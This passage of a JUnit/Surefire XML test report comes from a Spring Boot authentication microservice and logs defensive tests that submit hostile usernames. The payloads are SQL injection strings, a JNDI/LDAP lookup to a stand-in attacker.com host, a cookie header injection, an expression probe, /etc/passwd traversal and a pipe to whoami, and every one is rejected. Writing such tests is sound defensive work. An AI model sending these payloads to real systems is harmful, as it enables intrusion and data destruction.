    <property name="java.vendor.version" value="Temurin-21.0.3+9"/>
    <property name="LOG_FILE" value="logs/seguridad-testing.log"/>
    <property name="localRepository" value="/home/usuario/.m2/repository"/>
    <property name="java.vendor.url.bug" value="https://github.com/adoptium/adoptium-support/issues"/>
    <property name="java.io.tmpdir" value="/tmp"/>
    <property name="com.zaxxer.hikari.pool_number" value="5"/>
    <property name="catalina.home" value="/tmp/tomcat.0.6636697425435454385"/>
    <property name="java.version" value="21.0.3"/>
    <property name="user.dir" value="/home/usuario/Asp/github repositorios/curso/CotizadorPcPartes/ms-seguridad"/>
    <property name="os.arch" value="amd64"/>
    <property name="java.vm.specification.name" value="Java Virtual Machine Specification"/>
    <property name="PID" value="103766"/>
    <property name="CONSOLE_LOG_CHARSET" value="UTF-8"/>
    <property name="catalina.base" value="/tmp/tomcat.0.13153354371558546849"/>
    <property name="native.encoding" value="UTF-8"/>
    <property name="java.library.path" value="/tmp/.mount_CursorVahEU1/usr/lib/:/tmp/.mount_CursorVahEU1/usr/lib32/:/tmp/.mount_CursorVahEU1/usr/lib64/:/tmp/.mount_CursorVahEU1/lib/:/tmp/.mount_CursorVahEU1/lib/i386-linux-gnu/:/tmp/.mount_CursorVahEU1/lib/x86_64-linux-gnu/:/tmp/.mount_CursorVahEU1/lib/aarch64-linux-gnu/:/tmp/.mount_CursorVahEU1/lib32/:/tmp/.mount_CursorVahEU1/lib64/::/usr/java/packages/lib:/usr/lib64:/lib64:/lib:/usr/lib"/>
    <property name="java.vm.info" value="mixed mode, sharing"/>
    <property name="stderr.encoding" value="UTF-8"/>
    <property name="java.vendor" value="Eclipse Adoptium"/>
    <property name="java.vm.version" value="21.0.3+9-LTS"/>
    <property name="sun.io.unicode.encoding" value="UnicodeLittle"/>
    <property name="java.class.version" value="65.0"/>
    <property name="CONSOLE_LOG_PATTERN" value="%d{HH:mm:ss.SSS} [%thread] %-5level %logger{36} - %msg%n"/>
    <property name="LOGGED_APPLICATION_NAME" value="[ms-seguridad-test] "/>
  </properties>
  <testcase name="shouldPreventSqlInjectionInUsername" classname="mx.com.qtx.seguridad.security.SecurityAttackProtectionTest" time="0.134">
    <system-out><![CDATA[17:10:16.700 [main] INFO  o.s.t.c.s.AnnotationConfigContextLoaderUtils - Could not detect default configuration classes for test class [mx.com.qtx.seguridad.security.SecurityAttackProtectionTest]: SecurityAttackProtectionTest does not declare any static, non-private, non-final, nested classes annotated with @Configuration.

  .   ____          _            __ _ _
 /\\ / ___'_ __ _ _(_)_ __  __ _ \ \ \ \
( ( )\___ | '_ | '_| | '_ \/ _` | \ \ \ \
 \\/  ___)| |_)| | | | | || (_| |  ) ) ) )
  '  |____| .__|_| |_|_| |_\__, | / / / /
 =========|_|==============|___/=/_/_/_/

 :: Spring Boot ::                (v3.5.3)

17:10:16.747 [main] INFO  m.c.q.s.s.SecurityAttackProtectionTest - Starting SecurityAttackProtectionTest using Java 21.0.3 with PID 103766 (started by usuario in /home/usuario/Asp/github repositorios/curso/CotizadorPcPartes/ms-seguridad)
17:10:16.747 [main] DEBUG m.c.q.s.s.SecurityAttackProtectionTest - Running with Spring Boot v3.5.3, Spring v6.2.8
17:10:16.747 [main] INFO  m.c.q.s.s.SecurityAttackProtectionTest - The following 1 profile is active: "test"
17:10:16.970 [main] INFO  o.s.d.r.c.RepositoryConfigurationDelegate - Bootstrapping Spring Data JPA repositories in DEFAULT mode.
17:10:16.979 [main] INFO  o.s.d.r.c.RepositoryConfigurationDelegate - Finished Spring Data repository scanning in 7 ms. Found 3 JPA repository interfaces.
17:10:17.058 [main] INFO  o.a.coyote.http11.Http11NioProtocol - Initializing ProtocolHandler ["http-nio-auto-4"]
17:10:17.058 [main] INFO  o.a.catalina.core.StandardService - Starting service [Tomcat]
17:10:17.059 [main] INFO  o.a.catalina.core.StandardEngine - Starting Servlet engine: [Apache Tomcat/10.1.42]
17:10:17.075 [main] INFO  o.a.c.c.C.[.[.[/seguridad/v1/api] - Initializing Spring embedded WebApplicationContext
17:10:17.115 [main] INFO  m.c.q.s.config.RsaKeyProvider - Generando nuevo par de llaves RSA de 2048 bits
17:10:17.186 [main] INFO  m.c.q.s.config.RsaKeyProvider - Par de llaves RSA generado exitosamente en Wed Jul 02 17:10:17 MST 2025
17:10:17.314 [main] INFO  o.s.o.j.p.SpringPersistenceUnitInfo - No LoadTimeWeaver setup: ignoring JPA class transformer
17:10:17.332 [main] WARN  org.hibernate.orm.deprecation - HHH90000025: MySQLDialect does not need to be specified explicitly using 'hibernate.dialect' (remove the property setting and it will be selected by default)
17:10:17.385 [main] INFO  o.s.o.j.LocalContainerEntityManagerFactoryBean - Initialized JPA EntityManagerFactory for persistence unit 'default'
17:10:17.514 [main] DEBUG m.c.q.s.s.JwtAuthenticationFilter - Filter 'jwtAuthenticationFilter' configured for use
17:10:17.532 [main] INFO  m.c.q.s.service.KeyManagementService - Iniciando KeyManagementService...
17:10:17.533 [main] INFO  m.c.q.s.service.KeyManagementService - KeyManagementService inicializado exitosamente
17:10:17.533 [main] INFO  m.c.q.s.service.KeyManagementService - Estado de llaves: RSA Key Info - Algorithm: RSA, KeySize: 2048 bits, Generated: Wed Jul 02 17:10:17 MST 2025, Modulus Length: 2048
17:10:17.610 [main] WARN  o.s.b.a.o.j.JpaBaseConfiguration$JpaWebConfiguration - spring.jpa.open-in-view is enabled by default. Therefore, database queries may be performed during view rendering. Explicitly configure spring.jpa.open-in-view to disable this warning
17:10:17.882 [main] INFO  o.a.coyote.http11.Http11NioProtocol - Starting ProtocolHandler ["http-nio-auto-4"]
17:10:17.889 [main] INFO  m.c.q.s.s.SecurityAttackProtectionTest - Started SecurityAttackProtectionTest in 1.179 seconds (process running for 31.528)
17:10:17.900 [http-nio-auto-4-exec-1] INFO  o.a.c.c.C.[.[.[/seguridad/v1/api] - Initializing Spring DispatcherServlet 'dispatcherServlet'
17:10:17.914 [http-nio-auto-4-exec-1] INFO  m.c.q.seguridad.service.AuthService - Intento de autenticación para usuario: admin'; DROP TABLE usuario; --
17:10:17.918 [http-nio-auto-4-exec-1] DEBUG org.hibernate.SQL - 
    /* <criteria> */ select
        u1_0.id,
        u1_0.activo,
        u1_0.fecha_creacion,
        u1_0.fecha_modificacion,
        u1_0.password,
        u1_0.usuario 
    from
        usuario u1_0 
    where
        u1_0.usuario=? 
        and u1_0.activo=?
17:10:17.921 [http-nio-auto-4-exec-1] WARN  m.c.q.seguridad.service.AuthService - Usuario no encontrado o inactivo: admin'; DROP TABLE usuario; --
17:10:17.921 [http-nio-auto-4-exec-1] ERROR m.c.q.seguridad.service.AuthService - Error de autenticación para usuario admin'; DROP TABLE usuario; --: Credenciales inválidas
17:10:17.935 [http-nio-auto-4-exec-2] INFO  m.c.q.seguridad.service.AuthService - Intento de autenticación para usuario: admin' OR '1'='1
17:10:17.939 [http-nio-auto-4-exec-2] DEBUG org.hibernate.SQL - 
    /* <criteria> */ select
        u1_0.id,
        u1_0.activo,
        u1_0.fecha_creacion,
        u1_0.fecha_modificacion,
        u1_0.password,
        u1_0.usuario 
    from
        usuario u1_0 
    where
        u1_0.usuario=? 
        and u1_0.activo=?
17:10:17.941 [http-nio-auto-4-exec-2] WARN  m.c.q.seguridad.service.AuthService - Usuario no encontrado o inactivo: admin' OR '1'='1
17:10:17.942 [http-nio-auto-4-exec-2] ERROR m.c.q.seguridad.service.AuthService - Error de autenticación para usuario admin' OR '1'='1: Credenciales inválidas
17:10:17.955 [http-nio-auto-4-exec-3] INFO  m.c.q.seguridad.service.AuthService - Intento de autenticación para usuario: admin' UNION SELECT * FROM usuario --
17:10:17.957 [http-nio-auto-4-exec-3] DEBUG org.hibernate.SQL - 
    /* <criteria> */ select
        u1_0.id,
        u1_0.activo,
        u1_0.fecha_creacion,
        u1_0.fecha_modificacion,
        u1_0.password,
        u1_0.usuario 
    from
        usuario u1_0 
    where
        u1_0.usuario=? 
        and u1_0.activo=?
17:10:17.959 [http-nio-auto-4-exec-3] WARN  m.c.q.seguridad.service.AuthService - Usuario no encontrado o inactivo: admin' UNION SELECT * FROM usuario --
17:10:17.960 [http-nio-auto-4-exec-3] ERROR m.c.q.seguridad.service.AuthService - Error de autenticación para usuario admin' UNION SELECT * FROM usuario --: Credenciales inválidas
17:10:17.968 [http-nio-auto-4-exec-4] INFO  m.c.q.seguridad.service.AuthService - Intento de autenticación para usuario: admin'; INSERT INTO usuario VALUES ('hacker', 'pass'); --
17:10:17.970 [http-nio-auto-4-exec-4] DEBUG org.hibernate.SQL - 
    /* <criteria> */ select
        u1_0.id,
        u1_0.activo,
        u1_0.fecha_creacion,
        u1_0.fecha_modificacion,
        u1_0.password,
        u1_0.usuario 
    from
        usuario u1_0 
    where
        u1_0.usuario=? 
        and u1_0.activo=?
17:10:17.974 [http-nio-auto-4-exec-4] WARN  m.c.q.seguridad.service.AuthService - Usuario no encontrado o inactivo: admin'; INSERT INTO usuario VALUES ('hacker', 'pass'); --
17:10:17.974 [http-nio-auto-4-exec-4] ERROR m.c.q.seguridad.service.AuthService - Error de autenticación para usuario admin'; INSERT INTO usuario VALUES ('hacker', 'pass'); --: Credenciales inválidas
17:10:17.986 [http-nio-auto-4-exec-5] INFO  m.c.q.seguridad.service.AuthService - Intento de autenticación para usuario: ' OR 1=1 --
17:10:17.989 [http-nio-auto-4-exec-5] DEBUG org.hibernate.SQL - 
    /* <criteria> */ select
        u1_0.id,
        u1_0.activo,
        u1_0.fecha_creacion,
        u1_0.fecha_modificacion,
        u1_0.password,
        u1_0.usuario 
    from
        usuario u1_0 
    where
        u1_0.usuario=? 
        and u1_0.activo=?
17:10:17.991 [http-nio-auto-4-exec-5] WARN  m.c.q.seguridad.service.AuthService - Usuario no encontrado o inactivo: ' OR 1=1 --
17:10:17.991 [http-nio-auto-4-exec-5] ERROR m.c.q.seguridad.service.AuthService - Error de autenticación para usuario ' OR 1=1 --: Credenciales inválidas
17:10:18.001 [http-nio-auto-4-exec-6] INFO  m.c.q.seguridad.service.AuthService - Intento de autenticación para usuario: admin'/**/OR/**/1=1--
17:10:18.003 [http-nio-auto-4-exec-6] DEBUG org.hibernate.SQL - 
    /* <criteria> */ select
        u1_0.id,
        u1_0.activo,
        u1_0.fecha_creacion,
        u1_0.fecha_modificacion,
        u1_0.password,
        u1_0.usuario 
    from
        usuario u1_0 
    where
        u1_0.usuario=? 
        and u1_0.activo=?
17:10:18.006 [http-nio-auto-4-exec-6] WARN  m.c.q.seguridad.service.AuthService - Usuario no encontrado o inactivo: admin'/**/OR/**/1=1--
17:10:18.006 [http-nio-auto-4-exec-6] ERROR m.c.q.seguridad.service.AuthService - Error de autenticación para usuario admin'/**/OR/**/1=1--: Credenciales inválidas
17:10:18.015 [http-nio-auto-4-exec-7] INFO  m.c.q.seguridad.service.AuthService - Intento de autenticación para usuario: admin' OR 'x'='x
17:10:18.017 [http-nio-auto-4-exec-7] DEBUG org.hibernate.SQL - 
    /* <criteria> */ select
        u1_0.id,
        u1_0.activo,
        u1_0.fecha_creacion,
        u1_0.fecha_modificacion,
        u1_0.password,
        u1_0.usuario 
    from
        usuario u1_0 
    where
        u1_0.usuario=? 
        and u1_0.activo=?
17:10:18.019 [http-nio-auto-4-exec-7] WARN  m.c.q.seguridad.service.AuthService - Usuario no encontrado o inactivo: admin' OR 'x'='x
17:10:18.020 [http-nio-auto-4-exec-7] ERROR m.c.q.seguridad.service.AuthService - Error de autenticación para usuario admin' OR 'x'='x: Credenciales inválidas
]]></system-out>
  </testcase>
  <testcase name="shouldRejectDangerousSpecialCharacters" classname="mx.com.qtx.seguridad.security.SecurityAttackProtectionTest" time="0.083">
    <system-out><![CDATA[17:10:18.034 [http-nio-auto-4-exec-8] INFO  m.c.q.seguridad.service.AuthService - Intento de autenticación para usuario: admin&amp#0;password
17:10:18.035 [http-nio-auto-4-exec-8] DEBUG org.hibernate.SQL - 
    /* <criteria> */ select
        u1_0.id,
        u1_0.activo,
        u1_0.fecha_creacion,
        u1_0.fecha_modificacion,
        u1_0.password,
        u1_0.usuario 
    from
        usuario u1_0 
    where
        u1_0.usuario=? 
        and u1_0.activo=?
17:10:18.040 [http-nio-auto-4-exec-8] WARN  m.c.q.seguridad.service.AuthService - Usuario no encontrado o inactivo: admin&amp#0;password
17:10:18.041 [http-nio-auto-4-exec-8] ERROR m.c.q.seguridad.service.AuthService - Error de autenticación para usuario admin&amp#0;password: Credenciales inválidas
17:10:18.051 [http-nio-auto-4-exec-9] INFO  m.c.q.seguridad.service.AuthService - Intento de autenticación para usuario: admin
Set-Cookie: admin=true
17:10:18.053 [http-nio-auto-4-exec-9] DEBUG org.hibernate.SQL - 
    /* <criteria> */ select
        u1_0.id,
        u1_0.activo,
        u1_0.fecha_creacion,
        u1_0.fecha_modificacion,
        u1_0.password,
        u1_0.usuario 
    from
        usuario u1_0 
    where
        u1_0.usuario=? 
        and u1_0.activo=?
17:10:18.055 [http-nio-auto-4-exec-9] WARN  m.c.q.seguridad.service.AuthService - Usuario no encontrado o inactivo: admin
Set-Cookie: admin=true
17:10:18.055 [http-nio-auto-4-exec-9] ERROR m.c.q.seguridad.service.AuthService - Error de autenticación para usuario admin
Set-Cookie: admin=true: Credenciales inválidas
17:10:18.063 [http-nio-auto-4-exec-10] INFO  m.c.q.seguridad.service.AuthService - Intento de autenticación para usuario: admin${jndi:ldap://attacker.com/a}
17:10:18.065 [http-nio-auto-4-exec-10] DEBUG org.hibernate.SQL - 
    /* <criteria> */ select
        u1_0.id,
        u1_0.activo,
        u1_0.fecha_creacion,
        u1_0.fecha_modificacion,
        u1_0.password,
        u1_0.usuario 
    from
        usuario u1_0 
    where
        u1_0.usuario=? 
        and u1_0.activo=?
17:10:18.067 [http-nio-auto-4-exec-10] WARN  m.c.q.seguridad.service.AuthService - Usuario no encontrado o inactivo: admin${jndi:ldap://attacker.com/a}
17:10:18.067 [http-nio-auto-4-exec-10] ERROR m.c.q.seguridad.service.AuthService - Error de autenticación para usuario admin${jndi:ldap://attacker.com/a}: Credenciales inválidas
17:10:18.078 [http-nio-auto-4-exec-1] INFO  m.c.q.seguridad.service.AuthService - Intento de autenticación para usuario: admin#{7*7}
17:10:18.080 [http-nio-auto-4-exec-1] DEBUG org.hibernate.SQL - 
    /* <criteria> */ select
        u1_0.id,
        u1_0.activo,
        u1_0.fecha_creacion,
        u1_0.fecha_modificacion,
        u1_0.password,
        u1_0.usuario 
    from
        usuario u1_0 
    where
        u1_0.usuario=? 
        and u1_0.activo=?
17:10:18.082 [http-nio-auto-4-exec-1] WARN  m.c.q.seguridad.service.AuthService - Usuario no encontrado o inactivo: admin#{7*7}
17:10:18.082 [http-nio-auto-4-exec-1] ERROR m.c.q.seguridad.service.AuthService - Error de autenticación para usuario admin#{7*7}: Credenciales inválidas
17:10:18.090 [http-nio-auto-4-exec-2] INFO  m.c.q.seguridad.service.AuthService - Intento de autenticación para usuario: ../../../etc/passwd
17:10:18.092 [http-nio-auto-4-exec-2] DEBUG org.hibernate.SQL - 
    /* <criteria> */ select
        u1_0.id,
        u1_0.activo,
        u1_0.fecha_creacion,
        u1_0.fecha_modificacion,
        u1_0.password,
        u1_0.usuario 
    from
        usuario u1_0 
    where
        u1_0.usuario=? 
        and u1_0.activo=?
17:10:18.094 [http-nio-auto-4-exec-2] WARN  m.c.q.seguridad.service.AuthService - Usuario no encontrado o inactivo: ../../../etc/passwd
17:10:18.094 [http-nio-auto-4-exec-2] ERROR m.c.q.seguridad.service.AuthService - Error de autenticación para usuario ../../../etc/passwd: Credenciales inválidas
17:10:18.101 [http-nio-auto-4-exec-3] INFO  m.c.q.seguridad.service.AuthService - Intento de autenticación para usuario: admin|whoami
17:10:18.103 [http-nio-auto-4-exec-3] DEBUG org.hibernate.SQL - 
    /* <criteria> */ select
        u1_0.id,
        u1_0.activo,
        u1_0.fecha_creacion,
        u1_0.fecha_modificacion,
        u1_0.password,
        u1_0.usuario 
    from
        usuario u1_0 
    where
        u1_0.usuario=? 
        and u1_0.activo=?
17:10:18.105 [http-nio-auto-4-exec-3] WARN  m.c.q.seguridad.service.AuthService - Usuario no encontrado o inactivo: admin|whoami
17:10:18.105 [http-nio-auto-4-exec-3] ERROR m.c.q.seguridad.service.AuthService - Error de autenticación para usuario admin|whoami: Credenciales inválidas
]]></system-out>
  </testcase>
  <testcase name="shouldHandleRequestBursts" classname="mx.com.qtx.seguridad.security.SecurityAttackProtectionTest" time="13.837">
    <system-out><![CDATA[17:10:18.116 [http-nio-auto-4-exec-4] INFO  m.c.q.seguridad.service.AuthService - Intento de autenticación para usuario: admin
17:10:18.118 [http-nio-auto-4-exec-4] DEBUG org.hibernate.SQL - 
    /* <criteria> */ select
        u1_0.id,
        u1_0.activo,
        u1_0.fecha_creacion,
        u1_0.fecha_modificacion,
        u1_0.password,
        u1_0.usuario 
    from
        usuario u1_0 
    where
        u1_0.usuario=? 
        and u1_0.activo=?
17:10:18.387 [http-nio-auto-4-exec-4] DEBUG org.hibernate.SQL - 
    /* SELECT
        ra 
    FROM
        RolAsignado ra 
    JOIN
        
    FETCH
        ra.rol r 
    WHERE
        ra.usuario.id = :usuarioId 
        AND ra.activo = true 
        AND r.activo = true */ select
            ra1_0.id_rol,
            ra1_0.id_usuario,
            ra1_0.activo,
            ra1_0.fecha_creacion,
            ra1_0.fecha_modificacion,
            r1_0.id,
            r1_0.activo,
            r1_0.fecha_creacion,
            r1_0.fecha_modificacion,
            r1_0.nombre 
        from
            rol_asignado ra1_0 
        join
            rol r1_0 
                on r1_0.id=ra1_0.id_rol 
        where
            ra1_0.id_usuario=? 
            and ra1_0.activo=1 
            and r1_0.activo=1
17:10:18.390 [http-nio-auto-4-exec-4] DEBUG m.c.qtx.seguridad.service.JwtService - Configuración JWT - accessTokenExpiration: 3600000 ms
17:10:18.390 [http-nio-auto-4-exec-4] DEBUG m.c.qtx.seguridad.service.JwtService - Token times - now: Wed Jul 02 17:10:18 MST 2025, expiration: Wed Jul 02 18:10:18 MST 2025
17:10:18.393 [http-nio-auto-4-exec-4] DEBUG m.c.qtx.seguridad.service.JwtService - Access token generado para usuario: admin con roles: [ADMIN]
17:10:18.394 [http-nio-auto-4-exec-4] DEBUG m.c.qtx.seguridad.service.JwtService - Refresh token generado para usuario: admin
17:10:18.394 [http-nio-auto-4-exec-4] INFO  m.c.q.seguridad.service.AuthService - Autenticación exitosa para usuario: admin con roles: [ADMIN]
17:10:18.404 [http-nio-auto-4-exec-5] INFO  m.c.q.seguridad.service.AuthService - Intento de autenticación para usuario: admin
17:10:18.405 [http-nio-auto-4-exec-5] DEBUG org.hibernate.SQL - 
    /* <criteria> */ select
        u1_0.id,
        u1_0.activo,
        u1_0.fecha_creacion,
        u1_0.fecha_modificacion,
        u1_0.password,
        u1_0.usuario 
    from
        usuario u1_0 
    where
        u1_0.usuario=? 
        and u1_0.activo=?
17:10:18.664 [http-nio-auto-4-exec-5] DEBUG org.hibernate.SQL - 
    /* SELECT
        ra 
    FROM
        RolAsignado ra 
    JOIN
        
    FETCH
        ra.rol r 
    WHERE
        ra.usuario.id = :usuarioId 
        AND ra.activo = true 
        AND r.activo = true */ select
            ra1_0.id_rol,
            ra1_0.id_usuario,
            ra1_0.activo,
            ra1_0.fecha_creacion,
            ra1_0.fecha_modificacion,
            r1_0.id,
            r1_0.activo,
            r1_0.fecha_creacion,
            r1_0.fecha_modificacion,
            r1_0.nombre 
        from
            rol_asignado ra1_0 
        join
            rol r1_0 
                on r1_0.id=ra1_0.id_rol 
        where
            ra1_0.id_usuario=? 
            and ra1_0.activo=1 
            and r1_0.activo=1
17:10:18.667 [http-nio-auto-4-exec-5] DEBUG m.c.qtx.seguridad.service.JwtService - Configuración JWT - accessTokenExpiration: 3600000 ms
17:10:18.667 [http-nio-auto-4-exec-5] DEBUG m.c.qtx.seguridad.service.JwtService - Token times - now: Wed Jul 02 17:10:18 MST 2025, expiration: Wed Jul 02 18:10:18 MST 2025
17:10:18.669 [http-nio-auto-4-exec-5] DEBUG m.c.qtx.seguridad.service.JwtService - Access token generado para usuario: admin con roles: [ADMIN]
17:10:18.670 [http-nio-auto-4-exec-5] DEBUG m.c.qtx.seguridad.service.JwtService - Refresh token generado para usuario: admin
17:10:18.670 [http-nio-auto-4-exec-5] INFO  m.c.q.seguridad.service.AuthService - Autenticación exitosa para usuario: admin con roles: [ADMIN]
17:10:18.678 [http-nio-auto-4-exec-6] INFO  m.c.q.seguridad.service.AuthService - Intento de autenticación para usuario: admin
17:10:18.680 [http-nio-auto-4-exec-6] DEBUG org.hibernate.SQL - 
    /* <criteria> */ select
        u1_0.id,
        u1_0.activo,
        u1_0.fecha_creacion,
        u1_0.fecha_modificacion,
        u1_0.password,
        u1_0.usuario 
    from
        usuario u1_0 
    where
        u1_0.usuario=? 
        and u1_0.activo=?
17:10:18.944 [http-nio-auto-4-exec-6] DEBUG org.hibernate.SQL - 
    /* SELECT
        ra 
    FROM
        RolAsignado ra 
    JOIN
        
    FETCH
        ra.rol r 
    WHERE
        ra.usuario.id = :usuarioId 
        AND ra.activo = true 
        AND r.activo = true */ select
            ra1_0.id_rol,
            ra1_0.id_usuario,
            ra1_0.activo,
            ra1_0.fecha_creacion,
            ra1_0.fecha_modificacion,
            r1_0.id,
            r1_0.activo,
            r1_0.fecha_creacion,
            r1_0.fecha_modificacion,
            r1_0.nombre 
        from
            rol_asignado ra1_0 
        join
            rol r1_0 
                on r1_0.id=ra1_0.id_rol 
        where
            ra1_0.id_usuario=? 
            and ra1_0.activo=1 
            and r1_0.activo=1
17:10:18.947 [http-nio-auto-4-exec-6] DEBUG m.c.qtx.seguridad.service.JwtService - Configuración JWT - accessTokenExpiration: 3600000 ms
17:10:18.947 [http-nio-auto-4-exec-6] DEBUG m.c.qtx.seguridad.service.JwtService - Token times - now: Wed Jul 02 17:10:18 MST 2025, expiration: Wed Jul 02 18:10:18 MST 2025
17:10:18.948 [http-nio-auto-4-exec-6] DEBUG m.c.qtx.seguridad.service.JwtService - Access token generado para usuario: admin con roles: [ADMIN]
17:10:18.950 [http-nio-auto-4-exec-6] DEBUG m.c.qtx.seguridad.service.JwtService - Refresh token generado para usuario: admin
17:10:18.950 [http-nio-auto-4-exec-6] INFO  m.c.q.seguridad.service.AuthService - Autenticación exitosa para usuario: admin con roles: [ADMIN]
17:10:18.958 [http-nio-auto-4-exec-7] INFO  m.c.q.seguridad.service.AuthService - Intento de autenticación para usuario: admin
17:10:18.962 [http-nio-auto-4-exec-7] DEBUG org.hibernate.SQL - 
    /* <criteria> */ select
        u1_0.id,
        u1_0.activo,
        u1_0.fecha_creacion,
        u1_0.fecha_modificacion,
        u1_0.password,
        u1_0.usuario 
    from
        usuario u1_0 
    where
        u1_0.usuario=? 
        and u1_0.activo=?
17:10:19.222 [http-nio-auto-4-exec-7] DEBUG org.hibernate.SQL - 
    /* SELECT
        ra 
    FROM
        RolAsignado ra 
    JOIN
        
    FETCH
        ra.rol r 
    WHERE
        ra.usuario.id = :usuarioId 
        AND ra.activo = true 
        AND r.activo = true */ select
            ra1_0.id_rol,
            ra1_0.id_usuario,
            ra1_0.activo,
            ra1_0.fecha_creacion,
            ra1_0.fecha_modificacion,
            r1_0.id,
            r1_0.activo,
            r1_0.fecha_creacion,
            r1_0.fecha_modificacion,
            r1_0.nombre 
        from
            rol_asignado ra1_0 
        join
            rol r1_0 
                on r1_0.id=ra1_0.id_rol 
        where
            ra1_0.id_usuario=? 
            and ra1_0.activo=1 
            and r1_0.activo=1
17:10:19.225 [http-nio-auto-4-exec-7] DEBUG m.c.qtx.seguridad.service.JwtService - Configuración JWT - accessTokenExpiration: 3600000 ms
17:10:19.225 [http-nio-auto-4-exec-7] DEBUG m.c.qtx.seguridad.service.JwtService - Token times - now: Wed Jul 02 17:10:19 MST 2025, expiration: Wed Jul 02 18:10:19 MST 2025
17:10:19.227 [http-nio-auto-4-exec-7] DEBUG m.c.qtx.seguridad.service.JwtService - Access token generado para usuario: admin con roles: [ADMIN]
17:10:19.228 [http-nio-auto-4-exec-7] DEBUG m.c.qtx.seguridad.service.JwtService - Refresh token generado para usuario: admin
17:10:19.228 [http-nio-auto-4-exec-7] INFO  m.c.q.seguridad.service.AuthService - Autenticación exitosa para usuario: admin con roles: [ADMIN]
17:10:19.235 [http-nio-auto-4-exec-8] INFO  m.c.q.seguridad.service.AuthService - Intento de autenticación para usuario: admin
17:10:19.236 [http-nio-auto-4-exec-8] DEBUG org.hibernate.SQL - 
    /* <criteria> */ select
        u1_0.id,
        u1_0.activo,
        u1_0.fecha_creacion,
        u1_0.fecha_modificacion,
        u1_0.password,
        u1_0.usuario 
    from
        usuario u1_0 
    where
        u1_0.usuario=? 
        and u1_0.activo=?
17:10:19.493 [http-nio-auto-4-exec-8] DEBUG org.hibernate.SQL - 
    /* SELECT
        ra 
    FROM
        RolAsignado ra 
    JOIN
        
    FETCH
        ra.rol r 
    WHERE
        ra.usuario.id = :usuarioId 
        AND ra.activo = true 
        AND r.activo = true */ select
            ra1_0.id_rol,
            ra1_0.id_usuario,
            ra1_0.activo,
            ra1_0.fecha_creacion,
            ra1_0.fecha_modificacion,
            r1_0.id,
            r1_0.activo,
            r1_0.fecha_creacion,
            r1_0.fecha_modificacion,
            r1_0.nombre 
        from
            rol_asignado ra1_0 
        join
            rol r1_0 
                on r1_0.id=ra1_0.id_rol 
        where
            ra1_0.id_usuario=? 
            and ra1_0.activo=1 
            and r1_0.activo=1
17:10:19.496 [http-nio-auto-4-exec-8] DEBUG m.c.qtx.seguridad.service.JwtService - Configuración JWT - accessTokenExpiration: 3600000 ms
17:10:19.496 [http-nio-auto-4-exec-8] DEBUG m.c.qtx.seguridad.service.JwtService - Token times - now: Wed Jul 02 17:10:19 MST 2025, expiration: Wed Jul 02 18:10:19 MST 2025
17:10:19.498 [http-nio-auto-4-exec-8] DEBUG m.c.qtx.seguridad.service.JwtService - Access token generado para usuario: admin con roles: [ADMIN]
17:10:19.500 [http-nio-auto-4-exec-8] DEBUG m.c.qtx.seguridad.service.JwtService - Refresh token generado para usuario: admin
17:10:19.500 [http-nio-auto-4-exec-8] INFO  m.c.q.seguridad.service.AuthService - Autenticación exitosa para usuario: admin con roles: [ADMIN]
17:10:19.509 [http-nio-auto-4-exec-9] INFO  m.c.q.seguridad.service.AuthService - Intento de autenticación para usuario: admin
17:10:19.510 [http-nio-auto-4-exec-9] DEBUG org.hibernate.SQL - 
    /* <criteria> */ select
        u1_0.id,
        u1_0.activo,
        u1_0.fecha_creacion,
        u1_0.fecha_modificacion,
        u1_0.password,
        u1_0.usuario 
    from
        usuario u1_0 
    where
        u1_0.usuario=? 
        and u1_0.activo=?
17:10:19.767 [http-nio-auto-4-exec-9] DEBUG org.hibernate.SQL - 
    /* SELECT
        ra 
    FROM
        RolAsignado ra 
    JOIN
        
    FETCH
        ra.rol r 
    WHERE
        ra.usuario.id = :usuarioId 
        AND ra.activo = true 
        AND r.activo = true */ select
            ra1_0.id_rol,
            ra1_0.id_usuario,
            ra1_0.activo,
            ra1_0.fecha_creacion,
            ra1_0.fecha_modificacion,
            r1_0.id,
            r1_0.activo,
            r1_0.fecha_creacion,
            r1_0.fecha_modificacion,
            r1_0.nombre 
        from
            rol_asignado ra1_0 
        join
            rol r1_0 
                on r1_0.id=ra1_0.id_rol 
        where
            ra1_0.id_usuario=? 
            and ra1_0.activo=1 
            and r1_0.activo=1
17:10:19.769 [http-nio-auto-4-exec-9] DEBUG m.c.qtx.seguridad.service.JwtService - Configuración JWT - accessTokenExpiration: 3600000 ms
17:10:19.769 [http-nio-auto-4-exec-9] DEBUG m.c.qtx.seguridad.service.JwtService - Token times - now: Wed Jul 02 17:10:19 MST 2025, expiration: Wed Jul 02 18:10:19 MST 2025
17:10:19.771 [http-nio-auto-4-exec-9] DEBUG m.c.qtx.seguridad.service.JwtService - Access token generado para usuario: admin con roles: [ADMIN]
17:10:19.773 [http-nio-auto-4-exec-9] DEBUG m.c.qtx.seguridad.service.JwtService - Refresh token generado para usuario: admin
17:10:19.773 [http-nio-auto-4-exec-9] INFO  m.c.q.seguridad.service.AuthService - Autenticación exitosa para usuario: admin con roles: [ADMIN]
17:10:19.780 [http-nio-auto-4-exec-10] INFO  m.c.q.seguridad.service.AuthService - Intento de autenticación para usuario: admin
17:10:19.782 [http-nio-auto-4-exec-10] DEBUG org.hibernate.SQL - 
    /* <criteria> */ select
        u1_0.id,
        u1_0.activo,
        u1_0.fecha_creacion,
        u1_0.fecha_modificacion,
        u1_0.password,
        u1_0.usuario 
    from
        usuario u1_0 
    where
        u1_0.usuario=? 
        and u1_0.activo=?
17:10:20.041 [http-nio-auto-4-exec-10] DEBUG org.hibernate.SQL - 
    /* SELECT
        ra 
    FROM
        RolAsignado ra 
    JOIN
        
    FETCH
        ra.rol r 
    WHERE
        ra.usuario.id = :usuarioId 
        AND ra.activo = true 
        AND r.activo = true */ select
            ra1_0.id_rol,
            ra1_0.id_usuario,
            ra1_0.activo,
            ra1_0.fecha_creacion,
            ra1_0.fecha_modificacion,
            r1_0.id,
            r1_0.activo,
            r1_0.fecha_creacion,
            r1_0.fecha_modificacion,
            r1_0.nombre 
        from
            rol_asignado ra1_0 
        join
            rol r1_0 
                on r1_0.id=ra1_0.id_rol 
        where
            ra1_0.id_usuario=? 
            and ra1_0.activo=1 
            and r1_0.activo=1
17:10:20.043 [http-nio-auto-4-exec-10] DEBUG m.c.qtx.seguridad.service.JwtService - Configuración JWT - accessTokenExpiration: 3600000 ms
17:10:20.043 [http-nio-auto-4-exec-10] DEBUG m.c.qtx.seguridad.service.JwtService - Token times - now: Wed Jul 02 17:10:20 MST 2025, expiration: Wed Jul 02 18:10:20 MST 2025
